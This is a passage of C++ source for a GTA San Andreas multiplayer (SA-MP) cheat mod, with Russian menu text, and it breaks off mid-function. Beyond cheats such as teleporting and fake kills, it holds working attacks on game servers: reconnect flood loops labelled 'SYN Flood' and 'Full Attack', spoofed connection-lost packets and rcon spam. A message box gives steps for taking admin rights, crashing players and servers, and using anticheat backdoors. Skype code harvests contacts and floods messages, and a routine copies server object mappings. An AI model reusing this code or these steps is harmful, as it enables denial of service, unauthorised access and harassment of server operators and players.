	struct vehicle_info *vinfo = vehicle_info_get( VEHICLE_SELF, 0 );
	if ( vinfo != NULL )
		vehicle_setPaintJob( vinfo, bCurrentPJ );
}
// MENU FUNCTIONS END

DWORD dwLastUpdate_MenuPopulator;
void menuPopulator()
{
	char buf[512];

	if(dwLastUpdate_MenuPopulator < (GetTickCount() - 10))
	{

		// Vehicle mods
		if(!TwIsBarMinimized(twBar_SPCarUpgrades))
		{
			// get vehicle_info
			struct vehicle_info *vinfo = vehicle_info_get( VEHICLE_SELF, 0 );
			if ( vinfo != NULL )
			{
				struct actor_info	*ainfo = actor_info_get( ACTOR_SELF, 0 );
				if ( vinfo->passengers[0] == ainfo )
				{
					// some variables
					int		iModelID = vinfo->base.model_alt_id;
					char	name[64];

					// No upgrades for these types
					eClientVehicleType	vehicleType = GetVehicleType( iModelID );
					if ( vehicleType == CLIENTVEHICLE_BOAT
						||	 vehicleType == CLIENTVEHICLE_TRAIN
						||	 vehicleType == CLIENTVEHICLE_HELI
						||	 vehicleType == CLIENTVEHICLE_PLANE
						||	 vehicleType == CLIENTVEHICLE_BIKE
						||	 vehicleType == CLIENTVEHICLE_BMX ) return;

					for ( int iUpgradeInfo = 0; iUpgradeInfo < VEHICLE_UPGRADES_COUNT; iUpgradeInfo++ )
					{
						if ( isUpgradeCompatible(cveh_upgrade_info[iUpgradeInfo].iModelID, vinfo) )
						{
							snprintf( name, sizeof(name), "%s %s", cveh_upgrade_info[iUpgradeInfo].upgradeCategoryName,
								cveh_upgrade_info[iUpgradeInfo].upgradeName );
							TwAddButton(twBar_SPCarUpgrades, name, menuAddUpgrade, (void *)cveh_upgrade_info[iUpgradeInfo].iModelID, NULL);

							// skip matching sideskirt
							if ( cveh_upgrade_info[iUpgradeInfo].upgradeCategoryName == "Sideskirt"
								||	 cveh_upgrade_info[iUpgradeInfo].upgradeCategoryName == "Vents" ) iUpgradeInfo++;
						}
					}
				}
			}
			else
				TwRemoveAllVars(twBar_SPCarUpgrades);

		}

		// Vehicle colors and paintjobs
		if(!TwIsBarMinimized(twBar_SPCarColorPJ))
		{
			// get vehicle_info
			struct vehicle_info *vinfo = vehicle_info_get( VEHICLE_SELF, 0 );
			if ( vinfo != NULL )
			{
				struct actor_info	*ainfo = actor_info_get( ACTOR_SELF, 0 );
				if ( vinfo->passengers[0] == ainfo )
				{
					TwAddVarRW(twBar_SPCarColorPJ, "Color 1", TW_TYPE_UINT8, &vinfo->color[0], " label='Color 1' min=0 max=126 ");
					TwAddVarRW(twBar_SPCarColorPJ, "Color 2", TW_TYPE_UINT8, &vinfo->color[1], " label='Color 2' min=0 max=126 ");

					TwAddVarRW(twBar_SPCarColorPJ, "Paintjob", TW_TYPE_UINT8, &bCurrentPJ, " label='Paintjob' min=0 max=3 ");
					TwAddButton(twBar_SPCarColorPJ, "PJ_Button", menuChangePaintjob, NULL, " label='Change paintjob' ");
				}
			}
			else
				TwRemoveAllVars(twBar_SPCarColorPJ);
		}

		// Vehicle menu
		if(!TwIsBarMinimized(twBar_SPVehicles))
		{
			int	i;
			char name[64];

			TwRemoveAllVars(twBar_SPVehicles);

			TwAddButton(twBar_SPVehicles, "Настройки", NULL, NULL, NULL);
			TwAddVarRW(twBar_SPVehicles, "Заморозка машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehicles_warp_invert, NULL);
			TwAddVarRW(twBar_SPVehicles, "ТП в машину", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehicles_freeze, NULL);
			TwAddVarRW(twBar_SPVehicles, "ТП в нутри", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehicles_warpinside, NULL);

			TwAddButton(twBar_SPVehicles, " ", NULL, NULL, NULL);
			TwAddButton(twBar_SPVehicles, "МАШИНЫ", NULL, NULL, NULL);

			const struct actor_info *actor_self = actor_info_get( ACTOR_SELF, 0 );
			if ( pool_vehicle != NULL )
			{
				for ( i = 0; i < pool_vehicle->size; i++ )
				{
					static const struct vehicle_entry	unknown = { 0, VEHICLE_CLASS_CAR, "[Unknown vehicle]" };
					const struct vehicle_info			*info = vehicle_info_get( i, VEHICLE_ALIVE );
					const struct vehicle_entry			*vehicle;
					float								dist[3] = { 0.0f, 0.0f, 0.0f };
					uint16_t							sampvehid;

					if ( info == NULL )
						continue;

					vehicle = gta_vehicle_get_by_id( info->base.model_alt_id );

					if ( vehicle == NULL )
						vehicle = &unknown;

					if ( actor_self != NULL )
						vect3_vect3_sub( &info->base.matrix[4 * 3], &actor_self->base.matrix[4 * 3], dist );

					if ( vect3_near_zero( &info->base.matrix[4 * 3] ) )
						continue;

					sampvehid = getSAMPVehicleIDFromGTAVehicle((struct vehicle_info *)info);

					if(g_SAMP == NULL)
						snprintf( name, sizeof(name), "%s (%.2fm%s)", vehicle->name, vect3_length(dist),
						(info->passengers[0] == NULL) ? "" : ", Occupied" );
					else
						snprintf( name, sizeof(name), "(ID: %d) %s (%.2fm%s)",
						sampvehid,
						vehicle->name,
						vect3_length(dist),
						(info->passengers[0] == NULL) ? "" : ", Occupied" );

					snprintf(buf, sizeof(buf), " label='%s' ", name);

					g_menuVehicle[i].iGTAVehicleID = i;
					g_menuVehicle[i].sVehicleID = sampvehid;
					g_menuVehicle[i].pVehicleInfo = (struct vehicle_info *)info;
					TwAddButton(twBar_SPVehicles, NULL, menuSpawnVehicle, &g_menuVehicle[i], buf);
				}
			}
		}
//==================================================================================================================
	/*	if(!TwIsBarMinimized(twBar_SAMPPlayers2))
		{
			int i;
			char text[64], playermenuid[32];

			TwRemoveAllVars(twBar_SAMPPlayers2);

			snprintf(buf, sizeof(buf), "Current action: %s", g_MenuPlayerActions[iMenuPlayerAction]);
			TwAddButton(twBar_SAMPPlayers2, buf, NULL, NULL, NULL);

			snprintf(buf, sizeof(buf), "Current fake kill weapon: %s", fk_weapons[iMenuFakeKillWeaponIndex].Label);
			TwAddButton(twBar_SAMPPlayers2, buf, NULL, NULL, NULL);

			TwAddButton(twBar_SAMPPlayers, " ", NULL, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "-=== CHANGE ACTION ===-", NULL, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Warp to player", menuSetPlayerAction_WarpTo, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Warp to players vehicle", menuSetPlayerAction_WarpToPlayerVehicle, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Spectate player", menuSetPlayerAction_Spectate, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Fake kill", menuSetPlayerAction_FakeKill, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Show infos on player", menuSetPlayerAction_ShowInfos, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Mute player (anti-spam)", menuSetPlayerAction_MuteAntiSpam, NULL, NULL);
 

			TwAddButton(twBar_SAMPPlayers, "  ", NULL, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "PLAYERS", NULL, NULL, NULL);

			if ( g_Players == NULL )
				return;

			const struct actor_info *actor_self = actor_info_get( ACTOR_SELF, 0 );
			for ( i = 0; i < SAMP_PLAYER_MAX; i++ )
			{
				if ( actor_self == NULL && actor_self->base.matrix == NULL)
					continue;
				if ( g_Players->iIsListed[i] != 1 )
					continue;
				if(g_Players->pRemotePlayer[i] == NULL)
					continue;

				if((g_Players->pRemotePlayer[i]->pPlayerData == NULL ||
					g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor == NULL) ||
					g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped == NULL ||
					g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix == NULL)
				{
					if(vect3_near_zero(g_stStreamedOutInfo.fPlayerPos[i]))
						continue;

					snprintf(text, sizeof(text), "%s [ID: %d]",
						getPlayerName(i),
						i
						 
					);

					snprintf(buf, sizeof(buf), " label='%s' ", text);
					snprintf(playermenuid, sizeof(playermenuid), "player_%d", i);

					g_menuPlayer[i] = (uint16_t)i;
					TwAddButton(twBar_SAMPPlayers, playermenuid, menuPlayerActionHandler, &g_menuPlayer[i], buf);
				}
				else
				{
					if(g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped == NULL &&
						g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix == NULL)
						continue;

					snprintf(text, sizeof(text), "(ID: %d) %s (%.2fm)",
						i,
						getPlayerName(i),
						vect3_dist((float *)&g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[4*3], (float *)&actor_self->base.matrix[4 * 3])
					);

					snprintf(buf, sizeof(buf), " label='%s' ", text);
					snprintf(playermenuid, sizeof(playermenuid), "player_%d", i);

					g_menuPlayer[i] = (uint16_t)i;
					TwAddButton(twBar_SAMPPlayers, playermenuid, menuPlayerActionHandler, &g_menuPlayer[i], buf);
				}
			}
		}*/
//=======================================================================================================================================

		// Players menu
		if(!TwIsBarMinimized(twBar_SAMPPlayers))
		{
			int i;
			char text[64], playermenuid[32];

			TwRemoveAllVars(twBar_SAMPPlayers);

			snprintf(buf, sizeof(buf), "Текущее действие: %s", g_MenuPlayerActions[iMenuPlayerAction]);
			TwAddButton(twBar_SAMPPlayers, buf, NULL, NULL, NULL);

			snprintf(buf, sizeof(buf), "Действующее оружие убийства: %s", fk_weapons[iMenuFakeKillWeaponIndex].Label);
			TwAddButton(twBar_SAMPPlayers, buf, NULL, NULL, NULL);

			TwAddButton(twBar_SAMPPlayers, " ", NULL, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "-=== ИЗМЕНЕНИЕ ДЕЙТВИЯ ===-", NULL, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Телепорт к игроку", menuSetPlayerAction_WarpTo, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Телепорт к машине игрока", menuSetPlayerAction_WarpToPlayerVehicle, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Наблюдать", menuSetPlayerAction_Spectate, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Фейк килл", menuSetPlayerAction_FakeKill, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Информация о игроке", menuSetPlayerAction_ShowInfos, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "Затычка (anti-spam)", menuSetPlayerAction_MuteAntiSpam, NULL, NULL);
 

			TwAddButton(twBar_SAMPPlayers, "  ", NULL, NULL, NULL);
			TwAddButton(twBar_SAMPPlayers, "ИГРОКИ", NULL, NULL, NULL);

			if ( g_Players == NULL )
				return;

			const struct actor_info *actor_self = actor_info_get( ACTOR_SELF, 0 );
			for ( i = 0; i < SAMP_PLAYER_MAX; i++ )
			{
				if ( actor_self == NULL && actor_self->base.matrix == NULL)
					continue;
				if ( g_Players->iIsListed[i] != 1 )
					continue;
				if(g_Players->pRemotePlayer[i] == NULL)
					continue;

				if((g_Players->pRemotePlayer[i]->pPlayerData == NULL ||
					g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor == NULL) ||
					g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped == NULL ||
					g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix == NULL)
				{
					if(vect3_near_zero(g_stStreamedOutInfo.fPlayerPos[i]))
						continue;

					snprintf(text, sizeof(text), "(ID: %d) %s (%.2fm)",
						i,
						getPlayerName(i),
						vect3_dist((float *)&g_stStreamedOutInfo.fPlayerPos[i], (float *)&actor_self->base.matrix[4 * 3])
					);

					snprintf(buf, sizeof(buf), " label='%s' ", text);
					snprintf(playermenuid, sizeof(playermenuid), "player_%d", i);

					g_menuPlayer[i] = (uint16_t)i;
					TwAddButton(twBar_SAMPPlayers, playermenuid, menuPlayerActionHandler, &g_menuPlayer[i], buf);
				}
				else
				{
					if(g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped == NULL &&
						g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix == NULL)
						continue;

					snprintf(text, sizeof(text), "(ID: %d) %s (%.2fm)",
						i,
						getPlayerName(i),
						vect3_dist((float *)&g_Players->pRemotePlayer[i]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[4*3], (float *)&actor_self->base.matrix[4 * 3])
					);

					snprintf(buf, sizeof(buf), " label='%s' ", text);
					snprintf(playermenuid, sizeof(playermenuid), "player_%d", i);

					g_menuPlayer[i] = (uint16_t)i;
					TwAddButton(twBar_SAMPPlayers, playermenuid, menuPlayerActionHandler, &g_menuPlayer[i], buf);
				}
			}
		}

		// Objects
		if(!TwIsBarMinimized(twBar_SAMPObjects))
		{
			TwRemoveAllVars(twBar_SAMPObjects);

		
			if ( g_SAMP->pPools.pPool_Object == NULL )
				return;

			char	text[64], objectmenuid[32];
			int		i;
			for ( i = 0; i < SAMP_OBJECTS_MAX; i++ )
			{
				if ( g_SAMP->pPools.pPool_Object->iIsListed[i] != 1 )
					continue;
				if ( g_SAMP->pPools.pPool_Object->object[i] == NULL )
					continue;
				if ( g_SAMP->pPools.pPool_Object->object[i]->pGTAObject == NULL )
					continue;

				float	pos[3];
				vect3_copy( &g_SAMP->pPools.pPool_Object->object[i]->pGTAObject->base.matrix[4 * 3], pos );
				if ( vect3_near_zero(pos) )
					continue;

				snprintf( text, sizeof(text), "Обьект (%d, ModelID %d)", i,
					g_SAMP->pPools.pPool_Object->object[i]->pGTAObject->base.model_alt_id );

				snprintf(buf, sizeof(buf), " label='%s' ", text);
				snprintf(objectmenuid, sizeof(objectmenuid), "object_%d", i);

				g_menuObject[i] = (uint16_t)i;
				TwAddButton(twBar_SAMPObjects, objectmenuid, menuTeleportToObject, &g_menuObject[i], buf);
			}
		}

		// Pickups
		if(!TwIsBarMinimized(twBar_SAMPPickups))
		{
			TwRemoveAllVars(twBar_SAMPPickups);

		

			if ( g_SAMP->pPools.pPool_Pickup == NULL )
				return;

			char	text[64], pickupmenuid[32];
			int		i;
			for ( i = 0; i < SAMP_PICKUP_MAX; i++ )
			{
				if ( g_SAMP->pPools.pPool_Pickup->pickup[i].iModelID == 0 )
					continue;
				if ( g_SAMP->pPools.pPool_Pickup->pickup[i].iType == 0 )
					continue;

				snprintf( text, sizeof(text), "Пикап (%d, ModelID: %d)", i, g_SAMP->pPools.pPool_Pickup->pickup[i].iModelID );

				snprintf(buf, sizeof(buf), " label='%s' ", text);
				snprintf(pickupmenuid, sizeof(pickupmenuid), "pickup_%d", i);

				g_menuPickup[i] = (uint16_t)i;
				TwAddButton(twBar_SAMPPickups, pickupmenuid, menuTeleportToPickup, &g_menuPickup[i], buf);
			}
		}

		dwLastUpdate_MenuPopulator = GetTickCount();
	}
}

DWORD menuUpdateHook_origfunc = 0x50B8F0;
void _declspec(naked) menuUpdateHook()
{
	if(gta_menu_active)
	{
	_asm call menuUpdateHook_origfunc
	_asm pushad
	menuPopulator();
	_asm popad
	_asm retn
	}
}

void TW_CALL nrg(void *)
{
	int model = 522; //model car тоесть инфернусище 
   loadSpecificModel(model);  
   CVehicle *car = pGame->GetPools()->AddVehicle( eVehicleTypes(model) );  
   car->SetPosition( pPedSelf->GetPosition() );  
   vehicle_info *vinfo = (vehicle_info *)car->GetInterface();  
   vinfo->base.matrix[4*3+2] += 0.5;  
   GTAfunc_PutActorInCar( vinfo ); 
}

void TW_CALL nrg1(void *)
{
	 BitStream bsSend;
		bsSend.Write((BYTE)ID_CONNECTION_LOST);
		g_DrifeitClient->Send(&bsSend, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
}



void TW_CALL nrg2(void *)
{
	int model = 510; //model car тоесть инфернусище 
   loadSpecificModel(model);  
   CVehicle *car = pGame->GetPools()->AddVehicle( eVehicleTypes(model) );  
   car->SetPosition( pPedSelf->GetPosition() );  
   vehicle_info *vinfo = (vehicle_info *)car->GetInterface();  
   vinfo->base.matrix[4*3+2] += 0.5;  
   GTAfunc_PutActorInCar( vinfo ); 
}

void TW_CALL nrg2cc(void *)
{
	int model = 537; //model car тоесть инфернусище 
   loadSpecificModel(model);  
   CVehicle *car = pGame->GetPools()->AddVehicle( eVehicleTypes(model) );  
   car->SetPosition( pPedSelf->GetPosition() );  
   vehicle_info *vinfo = (vehicle_info *)car->GetInterface();  
   vinfo->base.matrix[4*3+2] += 0.5;  
   GTAfunc_PutActorInCar( vinfo ); 
}

void TW_CALL nrg228(void *)
{
	int model = 411; //model car тоесть инфернусище 
   loadSpecificModel(model);  
   CVehicle *car = pGame->GetPools()->AddVehicle( eVehicleTypes(model) );  
   car->SetPosition( pPedSelf->GetPosition() );  
   vehicle_info *vinfo = (vehicle_info *)car->GetInterface();  
   vinfo->base.matrix[4*3+2] += 0.5;  
   GTAfunc_PutActorInCar( vinfo ); 
}


void TW_CALL nrg3(void *)
{
	int send[100000];
	addMessageToChatWindow("{FFFFFF}Возможно сервер упал.", send);
	 BitStream menua;
	menua.Write(1);
	g_DrifeitClient->RPC(RPC_MenuQuit, &menua, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0); 
}





#import "Skype4COM.dll" 
using namespace SKYPE4COMLib;
void TW_CALL nrg15(void *)
{
	addMessageToChatWindow("Зайдите в скайп что бы разрешить доступ SA-MP Skype Z0R");
	// Инициализмруем COM соединение 
  CoInitialize(NULL); 
 
  // Создаем Skype объект 
  SKYPE4COMLib::ISkypePtr pSkype(__uuidof(SKYPE4COMLib::Skype)); 
 
  // Соединяемся с Skype API 
  pSkype->Attach(6,VARIANT_TRUE); 

  // Получаем версию клиента и выводим ее 
  _bstr_t bstrSkypeVersion = pSkype->GetVersion(); 
  addMessageToChatWindow("Skype client version %s\n", (char*)bstrSkypeVersion); 
  
  //Печатаем версию COM "обертки" 
  _bstr_t bstrWrapperVersion = pSkype->GetApiWrapperVersion(); 
  addMessageToChatWindow("COM wrapper version %s\n", (char*)bstrWrapperVersion);  

  pSkype = NULL; 
  CoUninitialize();
}

void TW_CALL nrg16(void *)
{
	SKYPE4COMLib::ISkypePtr pSkype(__uuidof(SKYPE4COMLib::Skype));
	
 IChatMessage *message; 
  message = pSkype->SendMessage(_bstr_t(set.flooder1[0]), _bstr_t(set.flooder2[0])); 
  addMessageToChatWindow("Сообщение успешно отправлено.");  
}

void TW_CALL nrg109(void *)
{
	system("start http://crime-gaming.ucoz.ru");  
}


void TW_CALL nrg160(void *)
{
SKYPE4COMLib::ISkypePtr pSkype(__uuidof(SKYPE4COMLib::Skype));
IUserCollectionPtr contactList = pSkype->GetFriends();
for(int i = 1; i <= contactList->GetCount(); i++) {
  _bstr_t bstrHandle = contactList->GetItem(i)->GetHandle();
  _bstr_t bstrFullname = contactList->GetItem(i)->GetFullName();
  say("Skype Логин %s и Ник %s ", (char*)bstrHandle, (char*)bstrFullname);
}}


void TW_CALL nrg1601(void *)
{
system("cls");
static int time = 0;
if (GetTickCount() - 2000 > time)
{
MessageBox( 0, "№1 Взлом админки.\n\
Придумываем себе новый ник и заходим на сервер, в окошке регистрации указываем пароль Admin = 9 и регестрируемся. Все, админка у вас. Работает на 30% серверов\n\
№2 Крашим игроков скином\n\
Способ работает на 20% дрифт серверов. Заходим в меню управления персонажем и выбираем раздел Сменить скин ид скина пишем 300, игра зависает и всех кто был рядом с вами вылетят с сервера\n\
№3 AntiCheat NooBlocker\n\
В данном античите есть две лазейки, первая: команда /openwavesystem1994 - выключает сервер, вторая лазейка это написание слова в чат openwave1994 - дает нам ркон пароль\n\
№4 Обход антикрашера сервера\n\
Обход антикрашера в машине: едем в тюннинг салон в сан фиерро заезжаем и у нас вылазиет меню с тюннингом мы его не закрываем но в тоже время включаем крашер и начинаем ко всем телепортироваться и нас не кикает\n\
№5 Вырубаем сервер\n\
Придумываем себе новый ник и заходим на сервер и при регистрации указываем пароль в виде символов %s, или открываем таб кликаем на игрока и в личке пишем эти же символы и сервер вырубится", 0, 0 );
time = GetTickCount();
}//конец 			
}


///////////////////////////////////////////////////////////////////////////////////////////

int pmf=0;
void pmflood()
{
addMessageToChatWindow("{FFFFFF}Поддержка работы функций в [свернутом режиме] включена.");
while(true) {
if(pmf == 0) break;








}
addMessageToChatWindow("{FFFFFF}Поддержка работы функций в [свернутом режиме] выключена.");
}

void TW_CALL pmflooder(void *)
{
pmf ^= 1;
if(pmf == 1) CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)pmflood, NULL, NULL, NULL );
}






int pmfw=0;
void pmfloodw()
{
addMessageToChatWindow("{FFFFFF}SYN Flood включен.");
while(true) {
if(pmfw == 0) break;

		char nick[15] = {0};
		gen_random(nick, 15);
		setLocalPlayerName(nick); //ставим локальное имя(видим только мы)    
		//restartGame();//рестарт игры   
		g_SAMP->iGameState = 26;//ставим геймстейт(26 - ожидание подключения)
}
addMessageToChatWindow("{FFFFFF}SYN Flood выключен.");
}

void TW_CALL pmflooderw(void *)
{
pmfw ^= 1;
if(pmfw == 1) CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)pmfloodw, NULL, NULL, NULL );
}





int pmfwaa = 0;
void pmfloodwaa()
{
	addMessageToChatWindow("{FFFFFF}STORM SYN Flood включен.");
	while (true) {
		if (pmfwaa == 0) break;

		char nick[15] = { 0 };
		gen_random(nick, 15);
		setLocalPlayerName(nick); //ставим локальное имя(видим только мы)    
		//restartGame();//рестарт игры   
		g_SAMP->iGameState = 26;//ставим геймстейт(26 - ожидание подключения)
		SendDialogResponse(2, 1, 0, "wqqdsssdwqq127745");
	}
	addMessageToChatWindow("{FFFFFF}STORM SYN Flood выключен.");
}

void TW_CALL pmflooderwaa(void *)
{
	pmfwaa ^= 1;
	if (pmfwaa == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pmfloodwaa, NULL, NULL, NULL);
}





int pmfwq=0;
void pmfloodwq()
{
addMessageToChatWindow("{FFFFFF}Papa Kolya xD включен.");
while(true) {
if(pmfwq == 0) break;

		char nick[15] = {0};
		gen_random(nick, 15);
		setLocalPlayerName(nick); //ставим локальное имя(видим только мы)    
		//restartGame();//рестарт игры   
		g_SAMP->iGameState = 26;//ставим геймстейт(26 - ожидание подключения)
		Sleep(2000);
		rconWarnings();
		rconWarnings();
		rconWarnings();
}
addMessageToChatWindow("{FFFFFF}Papa Kolya xD выключен.");
}

void TW_CALL pmflooderw1(void *)
{
pmfwq ^= 1;
if(pmfwq == 1) CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)pmfloodwq, NULL, NULL, NULL );
}




int pmfwq1=0;
void pmfloodwq1()
{
addMessageToChatWindow("{FFFFFF}Full Attack включен.");
while(true) {
if(pmfwq1 == 0) break;
	//Sleep(60);	
	char nick[15] = {0};
		gen_random(nick, 5);
		setLocalPlayerName(nick); //ставим локальное имя(видим только мы)   
		//disconnect( 10 );//дисконнкет от сервера(выход)   
		//restartGame();//рестарт игры   
		g_SAMP->iGameState = 26;//ставим геймстейт(26 - ожидание подключения)	
}
addMessageToChatWindow("{FFFFFF}Full Attack выключен.");
}

void TW_CALL pmflooderw11(void *)
{
pmfwq1 ^= 1;
if(pmfwq1 == 1) CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)pmfloodwq1, NULL, NULL, NULL );
}





/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


void CALLBACK StatusProc(const void *buffer, DWORD length, void *user)
{
    if (buffer && !length && (DWORD)user==0) // got HTTP/ICY tags, and this is still the current request
    addMessageToChatWindow( "loading.." );
}

void TW_CALL nrg1601w(void *)
{
	HSTREAM chan;
    BASS_StreamFree(chan);
	DWORD r;
    chan=BASS_StreamCreateURL("http://online.radiorecord.ru:8102/dc_128.m3u",0,BASS_STREAM_BLOCK|BASS_STREAM_STATUS|BASS_STREAM_AUTOFREE,StatusProc,(void*)r); // open URL
    BASS_ChannelPlay(chan,TRUE);
	//system("start http://volnorez.com/alexdriftfm");
}

void TW_CALL nrg109da(void *)
{
	 
	system("start http://vk.com/alexdrift1137");
	 
}
	



void TW_CALL nrg1601ws(void *)
{
setLocalPlayerName(set.flooder123[0]); //ставим локальное имя(видим только мы)   
disconnect( 500 );//дисконнкет от сервера(выход)   
restartGame();//рестарт игры   
g_SAMP->iGameState = 26;//ставим геймстейт(26 - ожидание подключения)  
}


void TW_CALL nrg1601qqx22(void *)
{
 system("cls");
static int time = 0;
if (GetTickCount() - 2000 > time)
{
 
MessageBox( 0, "Важно.\n\
Автор-разрабочик AlexDrift\n\
Если вы купили данный собейт значит вас наебали, \n\
 собейт совершенно бесплатный и скачать его можно на сайте Zeta-Hack.Ru\n\
 Разработка собейта закрыта окончательно, по всем вопросам пишите в ВК, Алексей Николаевич.", 0, 0 );
 
time = GetTickCount();
}//конец 			
}


void TW_CALL nrg1601q(void *)
{
 system("cls");
static int time = 0;
if (GetTickCount() - 2000 > time)
{
MessageBox( 0, "Команды для троллинга.\n\
Для обхода защиты требуется находиться в автомобиле\n\
/cslap [id] [1] - дает нам полный контроль над автомобилем товарища или врага \n\
/slap [id] [id машины] - подкинуть в небо \n\
/gethere [id] - телепортировать игрока к себе(обязательно надо быть в авто)\n\
/vtp [id] - телепортировать весь ближайший транспорт на голову игроку", 0, 0 );
time = GetTickCount();
}//конец 			
}








void TW_CALL nrg160211ws(void *)
{
char *param;
         FILE    *flStolenObjects = NULL;
        char    filename[512];
          snprintf( filename, sizeof(filename), "%s\\StealObjects.txt", g_szWorkingDirectory);
     
        flStolenObjects = fopen( filename, "a" );
          if (flStolenObjects == NULL)return;     
         DWORD baseObjAddr;
         float rotMatrix[3];
          int objectscount = 0, radius = 0;
        char comment[50];
          const struct actor_info *actor_self = actor_info_get( ACTOR_SELF, 0 );
          float dist[3] = { 0.0f, 0.0f, 0.0f };
          strcpy(comment, "");
          sscanf(param, "%d %[^\n]s", &radius, comment);
         fprintf(flStolenObjects, "// ================= [Дрифтюлекс] =================\n");
          if(strlen(comment))fprintf(flStolenObjects, "// %s\n", comment);
         for (int i = 0; i < SAMP_OBJECTS_MAX; i++ )
         {
          if ( g_SAMP->pPools.pPool_Object->iIsListed[i] != 1 )
            continue;
           if ( g_SAMP->pPools.pPool_Object->object[i] == NULL )
            continue;
           if ( g_SAMP->pPools.pPool_Object->object[i]->pGTAObject == NULL )
          continue;
        float    pos[3];
          vect3_copy( &g_SAMP->pPools.pPool_Object->object[i]->pGTAObject->base.matrix[4 * 3], pos );
if ( vect3_near_zero(pos) )
          continue;
         vect3_vect3_sub( &g_SAMP->pPools.pPool_Object->object[i]->pGTAObject->base.matrix[4 * 3], &actor_self->base.matrix[4 * 3], dist );
          if(vect3_length(dist) > radius && radius)continue;
         baseObjAddr = (DWORD)g_SAMP->pPools.pPool_Object->object[i];
           rotMatrix[0] = *(float *)(baseObjAddr + 0xAC);
          rotMatrix[1] = *(float *)(baseObjAddr + 0xB0);
         rotMatrix[2] = *(float *)(baseObjAddr + 0xB4);
           fprintf(flStolenObjects, "CreateObject(%d, %.4f, %.4f, %.4f, %.4f, %.4f, %.4f); // object (%d)\n", g_SAMP->pPools.pPool_Object->object[i]->pGTAObject->base.model_alt_id, pos[0], pos[1], pos[2],
           rotMatrix[0], rotMatrix[1], rotMatrix[2], i);
          objectscount++;
        }
  
         fclose(flStolenObjects);
     
       addMessageToChatWindow("%d обьектов Спизженого маппинга находиться в папке с ГТА в StealObjects.txt файле.", objectscount);
        }







/*actor_info * actor = actor_info_get(ACTOR_SELF, NULL);

	if (!actor) return;

	FILE * writeFile;

	char buffer[2048];

	snprintf(buffer, sizeof(buffer), "%s\\StealingData\\object_stealing_%s_%.2f_%.2f_%.2f.pwn", g_szWorkingDirectory,
		g_SAMP->szIP,
		actor->base.matrix[12],
		actor->base.matrix[13],
		actor->base.matrix[14]);

	writeFile = fopen(buffer, "w");


	int nums = 0;

	for (int i = 0; i < SAMP_OBJECTS_MAX; i++)
	{
		if (g_SAMP->pPools->pObject->iIsListed[i] != 1)
			continue;
		if (g_SAMP->pPools->pObject->object[i] == NULL)
			continue;
		if (g_SAMP->pPools->pObject->object[i]->pGTAEntity == NULL)
			continue;



		object_info * object = g_SAMP->pPools->pObject->object[i]->pGTAEntity;

		float pos[3];
		float mat[12];
		float rot[3];

		vect3_copy(&object->base.matrix[12], pos);
		

		memcpy(mat, object->base.matrix, sizeof(float)* 12);




		rot[0] = RADTODEG(asin(mat[4 + 2]));
		rot[1] = RADTODEG(-asin(mat[0 + 2]));
		rot[2] = RADTODEG(acos(mat[4 + 1]));


		if (rot[0] < 0.0 && rot[1] > 0.0f && rot[2] > 0.0f)
		{
			rot[0] = -rot[0] + 180.0f;
			rot[1] = rot[1] + 180.0f;
			rot[2] = rot[2] + 180.0f;
		}


		if (rot[0] > 0.0 && rot[1] < 0.0f && rot[2] > 0.0f)
		{
			rot[0] = 180.0f - rot[0];
			rot[1] = 90.0f - rot[1] * 2;
			rot[2] = rot[2] * 2 + RADTODEG(asin(mat[1]));
		}

		if (rot[0] < 0.0 && rot[1] < 0.0f && rot[2] > 0.0f)
		{
			rot[0] = 360.0f + rot[0];
			rot[1] = 270.0f - rot[1] * 2.0f;
			rot[2] = rot[2] * 4 - RADTODEG(asin(mat[9])) / 2.0f;
		}


		snprintf(buffer, sizeof(buffer), "CreateObject(%i,%f,%f,%f , %f,%f,%f );\r", object->base.model_alt_id,
			pos[0], pos[1], pos[2],
			rot[0], rot[1], rot[2]);
		fputs(buffer, writeFile);
		nums++;
		


	}


	fclose(writeFile);

	AddMessageToGoCChat(TEXT_OBJ_STEAL, nums);*/








void TW_CALL nrg160211ssssaws(void *)
{
static bool normalize = false;
	if (normalize == false)
	{
		//patch_set *pspp = &set.patch[18];
		//patcher_install(pspp);
